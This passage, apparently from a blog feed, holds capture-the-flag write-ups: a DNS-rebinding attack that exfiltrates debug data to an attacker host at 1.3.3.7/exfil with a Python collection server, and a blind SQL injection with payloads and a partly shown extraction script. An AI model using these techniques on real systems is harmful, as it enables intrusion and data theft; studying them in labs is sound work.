&lt;li>Then our script will run, and will send a request to &lt;code>http://attacker.com/debug&lt;/code>, which is now actually &lt;code>http://127.0.0.1/debug&lt;/code>, successfully grabbing the environment data that we need.&lt;/li>
&lt;li>Then we make a post request to &lt;code>http://1.3.3.7/exfil&lt;/code> containing the response to &lt;code>http://attacker.com/debug&lt;/code> (actually &lt;code>http://127.0.0.1/debug&lt;/code>), (and we set our CORS policy to allow requests from any domain), which successfully exfils the data to us.&lt;/li>
&lt;/ol>
&lt;p>A key element to making this attack work is having a low TTL on the DNS response, so the browser is forced to ask for the address twice.&lt;/p>
&lt;p>I decided to use this &lt;a class="link" href="https://lock.cmpxchg8b.com/rebinder.html" target="_blank" rel="noopener"
>dns rebind site&lt;/a> to facilitate the attack.
The first address will be that of my EC2 instance, and the second will be &lt;code>127.0.0.1&lt;/code>.
Then we just need to run the attack a few times until we get the elements to line up properly.&lt;/p>
&lt;p>However this attack kept failing.
I would always receive both requests to my ec2 instance, no matter how many times I tried.
I tried changing the delays, but never worked.
At the end of this article I will explore why this was.&lt;/p>
&lt;h3 id="bypass-2">Bypass 2
&lt;/h3>&lt;p>In the same hacktricks article, a second subtype of dns rebinding was mentioned.
Its very similar, but instead of depending on TTL to cause the browser to resolve the address, it will used availability of the server instead.
We can use a service like AWS Route 53 to register 2 IP addresses for the same domain name, in our case it will be (&lt;code>1.3.3.7&lt;/code> and &lt;code>127.0.0.1&lt;/code>).
For the first request to collect the CSRF payload, we allow the &lt;code>1.3.3.7&lt;/code> ec2 instance to remain available, but once the page is loaded, we kill the instance.
That way, when the next request is made to &lt;code>http://attacker.com/debug&lt;/code> and it tries to make the request to our ec2 instance at &lt;code>1.3.3.7&lt;/code>, the request will fail, and the victim&amp;rsquo;s browser will fallback to &lt;code>127.0.0.1&lt;/code>, allowing the attack to work.
I will also set up a second ec2 instance to collect the post request, because I don&amp;rsquo;t want to depend on the first ec2 instance booting up in time to catch the exfiltration POST request.
In AWS this is called failover-routing.
However, this requires registering a domain with AWS, which costs about 13$ depending on the name you chose, or 79$ to transfer in an existing domain.
I tried to find a free alternative, but wasn&amp;rsquo;t successful.
Seems like at the minimum you need a domain, which I was able to get on Gandi for about 3$.
Then I added in 2 DNS A records with the address of my ec2 instance and &lt;code>0.0.0.0&lt;/code> as per the suggestion on HackTricks.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/8.png"
width="993"
height="114"
srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/8_huaf59b0db051cbccc042266550b267afd_5360_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/8_huaf59b0db051cbccc042266550b267afd_5360_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="2 DNS A records"
class="gallery-image"
data-flex-grow="871"
data-flex-basis="2090px"
>&lt;/p>
&lt;p>The min TTL is 300, but fortunately we won&amp;rsquo;t depend on TTL for this attack, since we just depend on connectivity causing the browser to fallback to the alternative address (&lt;code>0.0.0.0&lt;/code>).&lt;/p>
&lt;p>AND THIS WORKED !!&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/9.png"
width="683"
height="117"
srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/9_hu7d4752c376da2419cce15044c6d98500_7470_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/9_hu7d4752c376da2419cce15044c6d98500_7470_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Kill the server after the first request"
class="gallery-image"
data-flex-grow="583"
data-flex-basis="1401px"
> &lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/10.png"
width="629"
height="562"
srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/10_hu5fc19c9a5454334247fdaa9977a17e1b_15410_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/10_hu5fc19c9a5454334247fdaa9977a17e1b_15410_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Request to exfil contains our debug info"
class="gallery-image"
data-flex-grow="111"
data-flex-basis="268px"
>&lt;/p>
&lt;p>At this point just little automation for killing the payload server after the first request, and saving the post request for further examination:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/usr/bin/python3&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">http.server&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">HTTPServer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">SimpleHTTPRequestHandler&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">test&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">sys&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">CORSRequestHandler&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">SimpleHTTPRequestHandler&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">end_headers&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send_header&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Access-Control-Allow-Origin&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;*&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">SimpleHTTPRequestHandler&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">end_headers&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">do_GET&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;/index.html&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">SimpleHTTPRequestHandler&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">do_GET&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># Exit the program after serving the index.html file&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">SimpleHTTPRequestHandler&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">do_GET&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">do_POST&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">content_length&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">headers&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;Content-Length&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">post_data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">rfile&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">content_length&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;/exfil&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;debug.txt&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;wb&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">f&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">post_data&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[*] Exfil data written to debug.txt&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">test&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">CORSRequestHandler&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">HTTPServer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">port&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">80&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/12.png"
width="820"
height="650"
srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/12_hu95d6488530ee901344af53801fd2b1d7_80813_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/12_hu95d6488530ee901344af53801fd2b1d7_80813_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Current attack structure"
class="gallery-image"
data-flex-grow="126"
data-flex-basis="302px"
>&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/11.png"
width="683"
height="184"
srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/11_hueed3f851ca10f44d92646e6d96dbd821_11973_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/11_hueed3f851ca10f44d92646e6d96dbd821_11973_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Referral token acquired"
class="gallery-image"
data-flex-grow="371"
data-flex-basis="890px"
>&lt;/p></description></item><item><title>When Leetcode Meets Hacking</title><link>https://Kvn11.github.io/p/when-leetcode-meets-hacking/</link><pubDate>Thu, 08 Feb 2024 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/when-leetcode-meets-hacking/</guid><description>&lt;img src="https://Kvn11.github.io/p/when-leetcode-meets-hacking/img/hackthebox.jpg" alt="Featured image of post When Leetcode Meets Hacking" />&lt;h1 id="intro">Intro
&lt;/h1>&lt;p>Given that I&amp;rsquo;m currently grinding leetcode and app sec stuff, this challenge was super enjoyable.
The vulnerability is very straightforward and easy to spot, and you get to write a binary search script to leak the flag (you don&amp;rsquo;t have to, but it does offer optimal time complexity).&lt;/p>
&lt;h1 id="walkthrough">Walkthrough
&lt;/h1>&lt;p>There is an SQL injection available within the &lt;code>unsafequery()&lt;/code> function.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">unsafequery&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$pdo&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$id&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$stmt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$pdo&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;SELECT id, gamename, gamedesc, image FROM posts WHERE id = &amp;#39;&lt;/span>&lt;span class="si">$id&lt;/span>&lt;span class="s2">&amp;#39;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$stmt&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">PDO&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="na">FETCH_ASSOC&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nv">$result&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">catch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">Exception&lt;/span> &lt;span class="nv">$e&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">http_response_code&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">500&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;Internal Server Error&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">exit&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>This unsafe function can only be called when we have the &lt;code>Transfer-Encoding: chunked&lt;/code> header in our request, but if the query succeeds then we will only see an error message.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_SERVER&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;HTTP_TRANSFER_ENCODING&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$_SERVER&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;HTTP_TRANSFER_ENCODING&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;chunked&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$search&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;search&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">unsafequery&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$pdo&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$search&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$result&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;div class=&amp;#39;results&amp;#39;&amp;gt;No post id found.&amp;lt;/div&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">http_response_code&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">500&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;Internal Server Error&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">exit&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>However, this is enough for blind SQL.
We can iterate over the indices of the flag value, and compare each substring of length 1 at that index with another character, and make educated guesses about the value of the flag.
Take a look at the following:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">SELECT id, gamename, gamedesc, image from posts where id = &amp;#39;1&amp;#39; AND 1=1 ;--
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SELECT id, gamename, gamedesc, image from posts where id = &amp;#39;1&amp;#39; AND substr(&amp;#39;HTB&amp;#39;, 1, 1) = &amp;#39;H&amp;#39; ;--
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SELECT id, gamename, gamedesc, image FROM posts WHERE id = &amp;#39;1&amp;#39; AND substr((SELECT gamedesc FROM posts WHERE id = &amp;#39;6&amp;#39;), 1, 1) &amp;gt; &amp;#39;A&amp;#39; ;--
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>All of these statements will execute successfully, giving us the &lt;code>No post id found&lt;/code> message.&lt;/p>
&lt;p>It&amp;rsquo;s just a slightly more convuluted basic SQL injection, but you base your guess of the flag value based on whether the second condition resolves to True or False.
This is where leetcode comes in.
So the flag can contain any value from 0x20 to 0x7f (that is just the readable ASCII range).
So we can use a binary search algorithm to make a guess as to whether a character in the flag is greater or lesser than some mid range value.
We just take the mid point of 0x20 and 0x75, create a query that will give us the &lt;code>No post id found&lt;/code> message if the flag letter is greater, or give us a 500 error if its not.
Then we readjust the range, and keep repeating until only 1 character is left.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/usr/bin/python3&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">requests&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">URL&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;http://localhost:1337&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">PATH&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;/Controllers/Handlers/SearchHandler.php&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">build_query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">idx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">query&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;search=6&amp;#39; AND substr((SELECT gamedesc FROM posts where id = &amp;#39;6&amp;#39;), &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">idx&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">, 1) &amp;gt; &amp;#39;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#39; ;--&amp;#34;&lt;/span>
